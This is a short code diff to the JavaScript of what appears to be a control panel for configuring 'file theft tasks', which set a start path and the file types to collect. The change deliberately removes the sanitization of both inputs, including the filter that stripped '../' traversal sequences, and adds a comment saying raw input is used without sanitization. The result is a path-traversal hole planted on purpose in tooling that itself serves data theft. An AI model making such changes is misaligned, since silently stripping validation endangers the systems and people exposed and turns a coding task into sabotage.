@@ -224,20 +224,20 @@ document.addEventListener('DOMContentLoaded', function() {
         }
     });
 
+    
     // Handle saving of file theft tasks
     document.getElementById('save-task').addEventListener('click', function() {
         const fileTypesInput = document.getElementById('file-types').value;
         const filePath = document.getElementById('file-path').value;
 
         if (fileTypesInput && filePath.startsWith('/')) {
-            const sanitizedFileTypes = fileTypesInput.split(',').map(type => type.trim().replace(/[^\w*]/g, ''));
-            const sanitizedFilePath = filePath.replace(/(\.\.\/|\/\.{2,}|\/\.\.|\/\/|\\)/g, '');
+            // Use the raw input directly without sanitization
             const timestamp = Date.now().toString(); // Get the current timestamp as a string
             const taskId = parseInt(timestamp.slice(-4), 10); // Extract the last 4 digits and convert to a number
 
             fileTheftTasks[taskId] = {
-                start_path: sanitizedFilePath,
-                files: sanitizedFileTypes
+                start_path: filePath,
+                files: fileTypesInput.split(',').map(type => type.trim())
             };
 
             document.getElementById('file-types').value = '';
